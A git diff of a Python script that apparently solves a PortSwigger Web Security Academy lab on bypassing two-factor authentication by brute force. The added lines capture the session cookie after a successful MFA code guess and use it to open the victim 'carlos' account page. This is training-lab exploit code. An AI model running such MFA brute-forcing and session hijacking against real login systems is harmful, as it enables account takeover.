@@ -1,4 +1,5 @@
 #https://portswigger.net/academy/labs/launch/28468f8ce00fc3bd7c323d598659c718d294c4aa39e6a5e2b244b48b1116493e?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-bypass-using-a-brute-force-attack
+#USE mfa-bruteforce-httpx FOR THE BEST OPTIMIZATION
 import requests
 import re
 from bs4 import BeautifulSoup
@@ -45,10 +46,16 @@ while(True):
         mfa_response = client.post(url=login2, data=mfa_payload, allow_redirects=False)
         print(mfa_response.status_code)
         
-        #if("4-digit security" in mfa_response.text): print("good")
-        #elif ("Username" in mfa_response.text): print("bad")
         print(i)
         if(mfa_response.status_code == 200):
             continue
-        else: exit(0)
+        else: 
+            match = re.search(r'session=([^;]+)', mfa_response.headers['set-cookie'])
+            if match:
+                session_value = match.group(1)
+                carlos_url = url + mfa_response.headers['location']
+                r = requests.get(url=carlos_url, headers={'Cookie': f'session={session_value}'})
+                #request the carlos account page to finish the lab
+                print(f"login status code: {r.status_code}")
+            exit(0)
 
